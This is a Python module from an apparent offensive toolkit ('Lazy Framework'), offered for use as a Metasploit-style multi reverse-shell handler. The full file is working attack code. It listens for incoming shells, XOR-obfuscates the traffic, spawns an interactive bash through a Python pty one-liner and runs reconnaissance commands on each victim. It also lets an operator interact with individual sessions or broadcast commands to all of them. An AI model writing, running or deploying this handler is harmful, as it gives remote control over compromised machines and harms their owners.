# modules/payload/multi_handler.py
import socket
import threading
import os
import time
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()
BASE_DIR = Path(__file__).parent.parent.parent
LOG_DIR = BASE_DIR / "logs"
LOG_DIR.mkdir(exist_ok=True)

MODULE_INFO = {
    "name": "Multi Handler",
    "description": "Metasploit-style multi reverse shell handler",
    "author": "Lazy Framework",
    "rank": "Excellent",
    "platform": "multi",
    "dependencies": []
}

OPTIONS = {
    "LHOST": {"description": "Listener IP", "required": True, "default": "0.0.0.0"},
    "LPORT": {"description": "Listener Port", "required": True, "default": 4444}
}

# === SESSION CLASS ===
class Session:
    def __init__(self, conn, addr, sid):
        self.conn = conn
        self.addr = addr
        self.id = sid
        self.alive = True
        self.log_file = LOG_DIR / f"session_{sid}.log"
        self._log("Session opened")

    def _log(self, msg):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

    def send(self, cmd):
        try:
            enc = ''.join(chr(ord(c) ^ 0xAA) for c in cmd).encode('latin1') + b'\n'
            self.conn.send(enc)
            self._log(f"> {cmd}")
        except:
            self.alive = False

    def recv(self):
        try:
            data = self.conn.recv(8192)
            if not data: return None
            dec = ''.join(chr(b ^ 0xAA) for b in data).decode('utf-8', errors='ignore').strip()
            if dec: self._log(f"< {dec}")
            return dec
        except:
            self.alive = False
            return None

    def upgrade(self):
        self.send("python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/sh\")'")

    def close(self):
        try: self.conn.close()
        except: pass
        self.alive = False
        self._log("Session closed")

# === STATE ===
state = {
    "sessions": [],
    "lock": threading.Lock(),
    "counter": 0,
    "active": False,
    "thread": None
}

# === LISTENER ===
def listener_loop(lhost, lport):
    global state
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((lhost, lport))
        s.listen(100)
        console.print(f"[bold green][*] Listening on {lhost}:{lport}[/bold green]")
    except Exception as e:
        console.print(f"[red][!] Bind error: {e}[/red]")
        state["active"] = False
        return

    while state["active"]:
        try:
            s.settimeout(1)
            conn, addr = s.accept()
            with state["lock"]:
                state["counter"] += 1
                sess = Session(conn, addr, state["counter"])
                state["sessions"].append(sess)
                console.print(f"[bold cyan][+] Session {sess.id} from {addr[0]}[/bold cyan]")
                threading.Thread(target=handle_client, args=(sess,), daemon=True).start()
        except:
            continue
    s.close()

def handle_client(sess):
    time.sleep(1)
    sess.upgrade()
    sess.send("whoami && pwd")
    while sess.alive and state["active"]:
        out = sess.recv()
        if out is None: break
    sess.close()
    console.print(f"[bold yellow][!] Session {sess.id} lost[/bold yellow]")

# === COMMAND FUNCTIONS ===
def cmd_sessions(args):
    if not state["sessions"]:
        console.print("[yellow]No active sessions[/yellow]")
        return
    table = Table(title="Active Sessions", box=box.SIMPLE_HEAVY)
    table.add_column("ID", style="cyan")
    table.add_column("Host", style="green")
    table.add_column("Port", style="yellow")
    table.add_column("Status")
    for s in state["sessions"]:
        status = "[green]Alive[/green]" if s.alive else "[red]Dead[/red]"
        table.add_row(str(s.id), s.addr[0], str(s.addr[1]), status)
    console.print(table)

def cmd_interact(args):
    if len(args) < 1:
        console.print("Usage: interact <id>", style="red")
        return
    try:
        sid = int(args[0])
        sess = next((s for s in state["sessions"] if s.id == sid and s.alive), None)
        if not sess:
            console.print(f"[red]Session {sid} not found[/red]")
            return
        console.print(f"[bold green]→ Session {sid} ({sess.addr[0]})[/bold green]")
        while sess.alive:
            cmd = console.input(f"[red]s[{sid}][/red]> ")
            if cmd.lower() in ["exit", "quit", "background"]: break
            sess.send(cmd)
            time.sleep(0.3)
            out = sess.recv()
            if out: console.print(out)
        console.print(f"[yellow]← Left session[/yellow]")
    except:
        console.print("[red]Invalid ID[/red]")

def cmd_broadcast(args):
    if not args:
        console.print("Usage: broadcast <cmd>", style="red")
        return
    cmd = " ".join(args)
    alive = [s for s in state["sessions"] if s.alive]
    for s in alive:
        s.send(cmd)
    console.print(f"[green]Sent to {len(alive)} sessions[/green]")

def cmd_kill(args):
    if len(args) < 1:
        console.print("Usage: kill <id>", style="red")
        return
    try:
        sid = int(args[0])
        sess = next((s for s in state["sessions"] if s.id == sid), None)
        if sess:
            sess.close()
            console.print(f"[red]Killed {sid}[/red]")
        else:
            console.print(f"[red]Session {sid} not found[/red]")
    except:
        console.print("[red]Invalid ID[/red]")

def cmd_stop_handler(args):
    global state
    if not state["active"]:
        console.print("[yellow]No handler running[/yellow]")
        return
    state["active"] = False
    if state["thread"]:
        state["thread"].join(2)
    with state["lock"]:
        for s in state["sessions"]:
            s.close()
        state["sessions"].clear()
    console.print("[bold red]Handler stopped[/bold red]")

# === RUN FUNCTION ===
def run(lzf_session, options):
    global state

    if state["active"]:
        console.print("[yellow]Handler already running[/yellow]")
        return

    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))

    state["active"] = True
    state["thread"] = threading.Thread(target=listener_loop, args=(lhost, lport), daemon=True)
    state["thread"].start()

    # === INJEKSI COMMAND KE FRAMEWORK ===
    framework = lzf_session.get("framework")
    if framework:
        framework.module_commands = {
            "sessions": cmd_sessions,
            "interact": cmd_interact,
            "broadcast": cmd_broadcast,
            "kill": cmd_kill,
            "stop_handler": cmd_stop_handler
        }

    # === PANEL INFO ===
    panel_text = (
        "[bold]Multi Handler Active[/bold]\n"
        f"[cyan]LHOST[/cyan]: [green]{lhost}[/green]\n"
        f"[cyan]LPORT[/cyan]: [green]{lport}[/green]\n\n"
        "[dim]Commands:[/dim]\n"
        "  [bold]sessions[/bold]          → List\n"
        "  [bold]interact <id>[/bold]     → Enter\n"
        "  [bold]broadcast <cmd>[/bold]   → All\n"
        "  [bold]kill <id>[/bold]         → Kill\n"
        "  [bold]stop_handler[/bold]      → Stop"
    )
    console.print(Panel(panel_text, title="Multi Handler", border_style="blue"))
